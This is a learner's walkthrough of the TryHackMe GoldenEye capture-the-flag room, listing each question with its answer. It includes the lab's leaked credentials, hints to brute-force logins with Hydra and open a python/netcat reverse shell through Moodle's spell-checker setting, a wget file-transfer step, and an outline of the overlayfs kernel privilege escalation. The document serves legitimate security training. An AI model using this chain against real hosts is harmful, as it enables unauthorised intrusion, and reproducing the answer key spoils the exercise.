<p align="center">November 7, 2024</p>
<p align="center">Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{185}}$$-day-streak in  <a href="https://tryhackme.com/r/hacktivities">TryHackMe</a>.</p>

<h1 align="center">
  $$\textcolor{#3bd62d}{\textnormal{ GoldenEye }}$$
</h1>
<p align="center">Bond, James Bond. A guided CTF.</p>
<p align="center">Access this 🆓 TryHackMe CTF Room clicking <a href="https://tryhackme.com/r/room/goldeneye">GoldenEye</a>.</p><br>
<p align="center">
  <img height="150px" hspace="20" src="https://tryhackme-images.s3.amazonaws.com/room-icons/77b55a2ac1ac79ca534d6fc003c042b3.png">
  <img height="150px" src="https://github.com/user-attachments/assets/42c32412-a499-4375-aec1-6f7065cad18b">
</p>

<p align="center">Summary</p>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [Intro & Enumeration](#1) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [Its mail time ...](#2) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [GoldenEye Operators Training](#3) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [Privilege Escalation](#4) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Room Complete](#5) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [My Journey](#6) </p>

<br>
<br>
<br>
<h2>Task 1. Intro & Enumeration<a id='1'></a></h2>
<p>This room will be a guided challenge to hack the James Bond styled box and get root.</p>
<p>Credit to <a href="https://www.vulnhub.com/author/creosote,584/">creosote</a> for creating this VM. <strong>This machine is used here with the explicit permission of the creator <3</strong>.</p>
<p>So.. Lets get started!</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>
<br>

> 1.1. <em>First things first, connect to our <a href="https://tryhackme.com/r/access">network</a> and deploy the machine.</em><br><a id='1.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>

> 1.2. <em>Use nmap to scan the network for all ports. How many ports are open?</em><br><a id='1.2'></a>
>> <code><strong>4</strong></code>

<br>

> 1.3. <em>Take a look on the website, take a dive into the source code too and remember to inspect all scripts!</em><br><a id='1.3'></a>
>> <code><strong>No answer needed</strong></code>

<br>

> 1.4. <em>Who needs to make sure they update their default password?</em><br><a id='1.4'></a>
>> <code><strong>boris</strong></code>

<br>

> 1.5. <em>Whats their password?</em><br><a id='1.5'></a>
>> <code><strong>InvincibleHack3r</strong></code>

<br>

> 1.6. <em>Now go use those credentials and login to a part of the site.</em><br><a id='1.5'></a>
>> <code><strong>No answer needed</strong></code>

<br>
<h2>Task 2. Its mail time ...<a id='2'></a></h2>
<p>Onto the next steps.. </p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>
<br>

> 2.1. <em>Take a look at some of the other services you found using your nmap scan. Are the credentials you have re-usable? </em><br><a id='2.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>

> 2.2. <em>If those creds don't seem to work, can you use another program to find other users and passwords? Maybe Hydra?Whats their new password?</em><br><a id='2.2'></a>
>> <code><strong>secret1!</strong></code>

<br>

> 2.3. <em>Inspect port 55007, what services is configured to use this port?</em><br><a id='2.3'></a>
>> <code><strong>telnet</strong></code>

<br>

> 2.4. <em>Login using that service and the credentials you found earlier.</em><br><a id='2.4'></a>
>> <code><strong>No answer needed</strong></code>

<br>

> 2.5. <em>What can you find on this service?</em><br><a id='2.5'></a>
>> <code><strong>emails</strong></code>

<br>

> 2.6. <em>What user can break Boris' codes?</em><br><a id='2.6'></a>
>> <code><strong>natalya</strong></code>

<br>
<h2>Task 3. GoldenEye Operatos Training<a id='3'></a></h2>
<p>Enumeration really is key. Making notes and referring back to them can be lifesaving. We shall now go onto getting a user shell.</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>
<br>
<p>If you remembered in some of the emails you discovered, there is the severnaya-station.com website. To get this working, you need up update your DNS records to reveal it.<br>

If you're on Linux edit your "/etc/hosts" file and add:<br>
<code>machines ip severnaya-station.com</code></p>

> 3.1. <em>If you're on Windows do the same but in the "c:\Windows\System32\Drivers\etc\hosts" file</em><br><a id='3.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>

> 3.2. <em>Once you have done that, in your browser navigate to: http://severnaya-station.com/gnocertdir</em><br><a id='3.2'></a>
>> <code><strong>No answer needed</strong></code>

<br>

> 3.3. <em>Try using the credentials you found earlier. Which user can you login as?</em><br><a id='3.3'></a>
>> <code><strong>xenia</strong></code>

<br>

> 3.4. <em>Have a poke around the site. What other user can you find?.</em><br><a id='3.4'></a>
>> <code><strong>doak</strong></code>

<br>

> 3.5. <em>What was this users password?</em><br><a id='3.5'></a>
>> <code><strong>goat</strong></code>

<br>

> 3.6. <em>Use this users credentials to go through all the services you have found to reveal more emails.</em><br><a id='3.6'></a>
>> <code><strong>No answer needed</strong></code>

<br>

> 3.7. <em>What is the next user you can find from doak?</em><br><a id='3.7'></a>
>> <code><strong>dr_doak</strong></code>

<br>

> 3.8. <em>What is this users password?</em><br><a id='3.8'></a>
>> <code><strong>4England!</strong></code>

<br>

> 3.9. <em>Take a look at their files on the moodle (severnaya-station.com)</em><br><a id='3.9'></a>
>> <code><strong>No answer needed</strong></code>

<br>

> 3.10. <em>Download the attachments and see if there are any hidden messages inside them?</em><br><a id='3.10'></a>
>> <code><strong>No answer needed</strong></code>

<br>

> 3.11. <em>Using the information you found in the last task, login with the newly found user.</em><br><a id='3.11'></a>
>> <code><strong>No answer needed</strong></code>

<br>

> 3.12. <em>As this user has more site privileges, you are able to edit the moodles settings. From here get a reverse shell using python and netcat.</em><br>
> Take a look into Aspell, the spell checker plugin.<a id='3.12'></a>
>> <code><strong>No answer needed</strong></code>

<br>
<h2>Task 4. Privilege Escalartion<a id='4'></a></h2>
<p>Now that you have enumerated enough to get an administrative moodle login and gain a reverse shell, its time to priv esc.</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>
<br>
<p>Download the <a href="https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123"> linuxprivchecker</a> to enumerate installed development tools.</p>
  
<p>To get the file onto the machine, you will need to wget your local machine as the VM will not be able to wget files on the internet. Follow the steps to get a file onto your VM:</p>

<ul style="list-style-type:square">
    <li>Download the linuxprivchecker file locally</li>
    <li>Navigate to the file on your file system</li>
    <li>Do: <code>python -m SimpleHTTPServer 1337</code>code> (leave this running)</li>
    <li>On the VM you can now do: <code>wget [your IP]/[file].py</code></li>
</ul></p>

<h3><strong>OR</strong></h3>

> 4.1. <em>Enumerate the machine manually.</em><br><a id='4.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>

> 4.2. <em>Whats the kernel version?</em><br><a id='4.2'></a>
>> <code><strong>3.13.0-32-generic</strong></code>

<br>

<p>This machine is vulnerable to the overlayfs exploit. The exploitation is technically very simple:</p>

<ul style="list-style-type:square">
    <li>Create new user and mount namespace using clone with CLONE_NEWUSER|CLONE_NEWNS flags.</li>
    <li>Mount an overlayfs using /bin as lower filesystem, some temporary directories as upper and work directory.</li>
    <li>Overlayfs mount would only be visible within user namespace, so let namespace process change CWD to overlayfs, thus making the overlayfs also visible outside the namespace via the proc filesystem.</li>
    <li>Make su on overlayfs world writable without changing the owner</li>
    <li>Let process outside user namespace write arbitrary content to the file applying a slightly modified variant of the SetgidDirectoryPrivilegeEscalation exploit.</li>
    <li>Execute the modified su binary</li>
</ul></p>


<br>

> 4.3. <em>You can download the exploit from here: <code>https://www.exploit-db.com/exploits/37292</code></em><br><a id='4.3'></a>
>> <code><strong>No answer needed</strong></code>

<br>

> 4.4. <em>Fix the exploit to work with the system you're trying to exploit. Remember, enumeration is your key!</em><br>
> What development tools are installed on the machine?<a id='4.4'></a>
>> <code><strong>No answer needed</strong></code>

<br>

> 4.5. <em>What is the root flag?</em><br><a id='4.5'></a>
>> <code><strong>_______________________________</strong></code>

